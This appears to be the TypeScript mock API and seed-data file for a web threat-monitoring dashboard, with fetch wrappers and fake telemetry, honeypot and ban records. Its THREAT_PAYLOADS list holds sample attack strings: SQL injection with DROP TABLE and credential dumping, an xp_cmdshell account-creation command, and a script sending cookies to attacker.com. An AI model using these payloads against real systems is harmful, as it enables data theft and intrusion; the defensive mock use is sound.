/**
 * ALIE Mock API Service Layer — v2
 *
 * Architecture:
 *  - `apiFetch`   — Central fetch utility for all REST calls to the FastAPI backend.
 *  - `apiPost`    — Convenience wrapper for POST/PUT/PATCH mutations.
 *  - Generator functions — Used only by the Redux mock layer until the backend is live.
 *
 * All REST calls route through `apiFetch` which:
 *   1. Normalises trailing slashes to prevent FastAPI 307 redirects.
 *   2. Injects `Content-Type: application/json` and optionally an auth token.
 *   3. Throws a structured `ApiError` on non-2xx responses for consistent error handling.
 */

import {
  TelemetryEvent,
  AssetRoute,
  TrapDeployment,
  BannedIP,
  ForensicPayload,
  ApiResponse,
} from '../types';

// ─── Environment ──────────────────────────────────────────────────────────────

const BASE_URL = (
  process.env.NEXT_PUBLIC_API_BASE_URL ?? 'http://localhost:8000'
).replace(/\/$/, ''); // strip any trailing slash from the env var itself

// ─── Structured Error ─────────────────────────────────────────────────────────

export class ApiError extends Error {
  constructor(
    public status: number,
    public detail: string,
  ) {
    super(`[ALIE API] ${status}: ${detail}`);
    this.name = 'ApiError';
  }
}

// ─── Trailing-Slash Normaliser ────────────────────────────────────────────────
/**
 * FastAPI routes are defined WITH a trailing slash by default.
 * Calling them without one triggers a 307 redirect which costs ~1 round-trip.
 * This utility ensures every path ends with exactly one `/`.
 *
 * Override: pass `{ trailingSlash: false }` for any route explicitly
 * registered without one.
 */
function normalisePath(path: string, trailingSlash = true): string {
  const clean = path.replace(/\/+$/, ''); // strip existing trailing slashes
  return trailingSlash ? `${clean}/` : clean;
}

// ─── Central Fetch Utility ────────────────────────────────────────────────────

export interface FetchOptions extends Omit<RequestInit, 'body'> {
  /** Whether to append a trailing slash. Default: true (matches FastAPI convention). */
  trailingSlash?: boolean;
  /**
   * Request body — will be JSON-serialised automatically.
   * Pass `undefined` or omit for GET/DELETE requests.
   */
  body?: unknown;
  /**
   * If provided, injected as `Authorization: Bearer <token>`.
   * In production, read this from your auth store or cookie.
   */
  authToken?: string;
}

/**
 * Core fetch wrapper. Handles:
 *  - Trailing-slash normalisation (prevents FastAPI 307 redirects)
 *  - Default `Content-Type: application/json` header
 *  - Optional `Authorization: Bearer` header
 *  - JSON serialisation of request body
 *  - Structured `ApiError` on non-2xx status codes
 */
export async function apiFetch<T>(
  path: string,
  { trailingSlash = true, body, authToken, headers: extraHeaders, ...rest }: FetchOptions = {},
): Promise<ApiResponse<T>> {
  const url = `${BASE_URL}${normalisePath(path, trailingSlash)}`;

  const headers: HeadersInit = {
    'Content-Type': 'application/json',
    Accept: 'application/json',
    ...(authToken ? { Authorization: `Bearer ${authToken}` } : {}),
    ...(extraHeaders ?? {}),
  };

  const response = await fetch(url, {
    ...rest,
    headers,
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });

  if (!response.ok) {
    let detail = response.statusText;
    try {
      const err = await response.json();
      // FastAPI formats validation errors as { detail: string | object[] }
      detail = typeof err.detail === 'string' ? err.detail : JSON.stringify(err.detail);
    } catch {
      // body wasn't JSON — keep statusText
    }
    throw new ApiError(response.status, detail);
  }

  return response.json() as Promise<ApiResponse<T>>;
}

// ─── Convenience Wrappers ─────────────────────────────────────────────────────

/** GET request. */
export const apiGet = <T>(path: string, opts?: Omit<FetchOptions, 'method' | 'body'>) =>
  apiFetch<T>(path, { ...opts, method: 'GET' });

/** POST request with a JSON body. */
export const apiPost = <T>(path: string, body: unknown, opts?: Omit<FetchOptions, 'method'>) =>
  apiFetch<T>(path, { ...opts, method: 'POST', body });

/** PUT request with a JSON body. */
export const apiPut = <T>(path: string, body: unknown, opts?: Omit<FetchOptions, 'method'>) =>
  apiFetch<T>(path, { ...opts, method: 'PUT', body });

/** DELETE request. */
export const apiDelete = <T>(path: string, opts?: Omit<FetchOptions, 'method' | 'body'>) =>
  apiFetch<T>(path, { ...opts, method: 'DELETE' });

// ─────────────────────────────────────────────────────────────────────────────
// MOCK DATA — Used by Redux slices until the FastAPI backend is wired up.
// Remove or tree-shake once real endpoints are live.
// ─────────────────────────────────────────────────────────────────────────────

export const IP_POOL = [
  '45.12.90.11', '192.168.1.55', '10.0.0.12', '172.16.89.231',
  '203.0.113.5', '142.250.190.46', '91.108.56.130', '34.117.59.81',
];

export const ENDPOINT_POOL = [
  { method: 'GET',    url: '/api/v1/users',                   isThreat: false },
  { method: 'POST',   url: '/api/v1/checkout',                isThreat: false },
  { method: 'GET',    url: '/api/v3/diagnostics',             isThreat: false },
  { method: 'GET',    url: "/api/v1/users?id=1%20OR%201=1",  isThreat: true,  signature: 'SQLi' },
  { method: 'POST',   url: '/api/v2/messages',                isThreat: true,  signature: 'XSS' },
  { method: 'GET',    url: '/admin/upload.php',               isThreat: true,  signature: 'RCE' },
  { method: 'GET',    url: '/api/v1/metrics',                 isThreat: false },
  { method: 'DELETE', url: '/api/v1/sessions/purge',          isThreat: false },
  { method: 'PUT',    url: '/config/remote-shell',            isThreat: true,  signature: 'XSS' },
  { method: 'PATCH',  url: '/api/v2/preferences',             isThreat: false },
] as const;

export const THREAT_PAYLOADS = [
  "SELECT * FROM users WHERE id = '1' OR '1'='1' --; DROP TABLE logs;",
  "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
  "UNION SELECT username, password FROM core_admin--",
  "'; EXEC xp_cmdshell('net user hacker pass123 /add')--",
  "GET /api/v4/auth/token_exchange HTTP/1.1\\r\\nHost: internal.risk-engine\\r\\nUser-Agent: Slowloris\\r\\n",
];

// ─── Seed Data ────────────────────────────────────────────────────────────────

export const SEED_TELEMETRY: TelemetryEvent[] = [
  {
    id: 'EVT-001',
    created_at: new Date(Date.now() - 5000).toISOString(),
    timestamp:  new Date(Date.now() - 5000).toISOString(),
    method: 'POST', url: '/api/v1/auth/exchange',
    ip: '192.168.1.104', action: 'ALLOWED', threat_signature: null,
  },
  {
    id: 'EVT-002',
    created_at: new Date(Date.now() - 15000).toISOString(),
    timestamp:  new Date(Date.now() - 15000).toISOString(),
    method: 'GET',  url: '/wp-admin.php?user=root',
    ip: '45.22.190.11', action: 'KILLED', threat_signature: 'SQLi', threatSignature: 'SQLi',
  },
  {
    id: 'EVT-003',
    created_at: new Date(Date.now() - 25000).toISOString(),
    timestamp:  new Date(Date.now() - 25000).toISOString(),
    method: 'GET',  url: '/api/v3/metrics/realtime',
    ip: '10.0.0.15', action: 'ALLOWED', threat_signature: null,
  },
  {
    id: 'EVT-004',
    created_at: new Date(Date.now() - 35000).toISOString(),
    timestamp:  new Date(Date.now() - 35000).toISOString(),
    method: 'PUT',  url: '/config/remote-shell',
    ip: '201.55.12.8', action: 'KILLED', threat_signature: 'XSS', threatSignature: 'XSS',
  },
  {
    id: 'EVT-005',
    created_at: new Date(Date.now() - 50000).toISOString(),
    timestamp:  new Date(Date.now() - 50000).toISOString(),
    method: 'DELETE', url: '/temp/cache/clear',
    ip: '192.168.1.104', action: 'ALLOWED', threat_signature: null,
  },
  {
    id: 'EVT-006',
    created_at: new Date(Date.now() - 65000).toISOString(),
    timestamp:  new Date(Date.now() - 65000).toISOString(),
    method: 'GET',  url: '/api/identity/check',
    ip: '192.168.1.22', action: 'ALLOWED', threat_signature: null,
  },
];

export const SEED_ASSETS: AssetRoute[] = [
  { path: '/srv/api/v1/auth',           target: '/validate-token',    method: 'POST',   compliance_state: 'SECURE',           added_latency: '240ms', error_rate: 0.0, complianceState: 'SECURE',           addedLatency: '240ms', errorRate: 0.0 },
  { path: '/srv/api/v2/user-profile',   target: '/deprecated-query',  method: 'GET',    compliance_state: 'SHADOW_DRIFT',     added_latency: '412ms', error_rate: 0.2, complianceState: 'SHADOW_DRIFT',     addedLatency: '412ms', errorRate: 0.2 },
  { path: '/tmp/dev/legacy-hooks',      target: '/internal-reset',    method: 'DELETE', compliance_state: 'ZOMBIE_EXCEPTION', added_latency: '12ms',  error_rate: 1.5, complianceState: 'ZOMBIE_EXCEPTION', addedLatency: '12ms',  errorRate: 1.5 },
  { path: '/srv/api/v1/payment',        target: '/process-payment',   method: 'POST',   compliance_state: 'SECURE',           added_latency: '890ms', error_rate: 0.0, complianceState: 'SECURE',           addedLatency: '890ms', errorRate: 0.0 },
  { path: '/srv/api/v1/inventory',      target: '/stock-update',      method: 'PATCH',  compliance_state: 'SECURE',           added_latency: '156ms', error_rate: 0.0, complianceState: 'SECURE',           addedLatency: '156ms', errorRate: 0.0 },
];

export const SEED_TRAPS: TrapDeployment[] = [
  { id: 'TRP-001', path: '/api/v4/auth/token_exchange',         type: 'Honeypot',      status: 'ACTIVE',  deployed_at: '2026-05-28 14:02:11', deployedAt: '2026-05-28 14:02:11' },
  { id: 'TRP-002', path: '/admin/panel/config?inject=TRUE',     type: 'Decoy Payload', status: 'TRAPPED', deployed_at: '2026-05-28 14:01:55', deployedAt: '2026-05-28 14:01:55' },
  { id: 'TRP-003', path: '/system/diag/heartbeat',              type: 'Tarpit',        status: 'ACTIVE',  deployed_at: '2026-05-28 13:58:22', deployedAt: '2026-05-28 13:58:22' },
  { id: 'TRP-004', path: '/user/profile/update?id=99',          type: 'Honeypot',      status: 'ACTIVE',  deployed_at: '2026-05-28 13:55:01', deployedAt: '2026-05-28 13:55:01' },
  { id: 'TRP-005', path: '/api/v4/search/global',               type: 'Tarpit',        status: 'ACTIVE',  deployed_at: '2026-05-28 13:52:19', deployedAt: '2026-05-28 13:52:19' },
];

export const SEED_BANS: BannedIP[] = [
  { id: 'BAN-001', created_at: new Date(Date.now() - 3600000).toISOString(),  timestamp: new Date(Date.now() - 3600000).toISOString(),  url: '/admin/panel/config?inject=TRUE',     ip: '45.2.11.90',  reason: 'SQLi Attempt' },
  { id: 'BAN-002', created_at: new Date(Date.now() - 7200000).toISOString(),  timestamp: new Date(Date.now() - 7200000).toISOString(),  url: '/api/v4/auth/token_exchange',          ip: '92.168.0.1',  reason: 'Slowloris Session' },
  { id: 'BAN-003', created_at: new Date(Date.now() - 14400000).toISOString(), timestamp: new Date(Date.now() - 14400000).toISOString(), url: '/system/diag/heartbeat',               ip: '201.55.12.8', reason: 'Tarpit Timeout' },
];

// ─── Generator Functions ──────────────────────────────────────────────────────

let eventCounter = 100;

export function generateRandomEvent(autoKill: boolean): TelemetryEvent {
  const endpoint = ENDPOINT_POOL[Math.floor(Math.random() * ENDPOINT_POOL.length)];
  const ip       = IP_POOL[Math.floor(Math.random() * IP_POOL.length)];
  eventCounter++;

  let action: TelemetryEvent['action'] = 'ALLOWED';
  let signature: string | null = null;

  if (endpoint.isThreat) {
    signature = endpoint.signature;
    action = autoKill ? 'BANNED' : 'KILLED';
  }

  const now = new Date().toISOString();
  return {
    id: `EVT-${eventCounter}`,
    created_at: now,
    timestamp:  now,           // backward compat alias
    method: endpoint.method as TelemetryEvent['method'],
    url: endpoint.url,
    ip,
    action,
    threat_signature: signature,
    threatSignature: signature ?? undefined, // backward compat alias
  };
}

export function generateForensicPayload(): ForensicPayload {
  const isSql   = Math.random() > 0.5;
  const ip      = IP_POOL[Math.floor(Math.random() * IP_POOL.length)];
  const payload = isSql ? THREAT_PAYLOADS[2] : THREAT_PAYLOADS[3];
  const now     = new Date().toISOString();

  return {
    id: Math.random().toString(36).slice(2),
    created_at: now,
    timestamp:  now.replace('T', ' ').substring(11, 19),
    header: `Host: gateway.risk.io\\nUser-Agent: Mozilla/5.0\\nX-Forwarded-For: ${ip}\\nContent-Type: application/json`,
    payload_data: payload,
    payload:      payload,    // backward compat alias
    signature: isSql ? 'SQLi' : 'RCE',
  };
}

export function generateShadowRoute(): AssetRoute {
  const paths   = ['/srv/api/v3/debug-log', '/srv/api/deprecated/config', '/srv/api/v1/hooks-receiver', '/tmp/dev/test-endpoint'];
  const targets = ['/get-raw-sys',          '/backup-restore',            '/webhook-pull',               '/test-dump'];
  const states: AssetRoute['compliance_state'][] = ['SHADOW_DRIFT', 'ZOMBIE_EXCEPTION'];

  const idx   = Math.floor(Math.random() * paths.length);
  const state = states[Math.floor(Math.random() * states.length)];
  const lat   = `${Math.floor(Math.random() * 500 + 50)}ms`;
  const err   = parseFloat((Math.random() * 2).toFixed(1));

  return {
    path: paths[idx], target: targets[idx], method: 'GET',
    compliance_state: state, added_latency: lat, error_rate: err,
    complianceState: state,  addedLatency:  lat, errorRate:  err,
  };
}

// ─── Chart Data Generator ─────────────────────────────────────────────────────

export function generateTrafficChartData(eventCount: number, threatCount: number) {
  return [
    { time: '00:00', traffic: 120, threats: 4  },
    { time: '00:30', traffic: 180, threats: 8  },
    { time: '01:00', traffic: 220, threats: 12 },
    { time: '01:30', traffic: 340, threats: 6  },
    { time: '02:00', traffic: 290, threats: 15 },
    { time: '02:30', traffic: 410, threats: 22 },
    { time: '03:00', traffic: 380, threats: 18 },
    { time: '03:30', traffic: 460, threats: 9  },
    { time: 'NOW',   traffic: 420 + eventCount * 3, threats: Math.max(0, threatCount - 1280) },
  ];
}
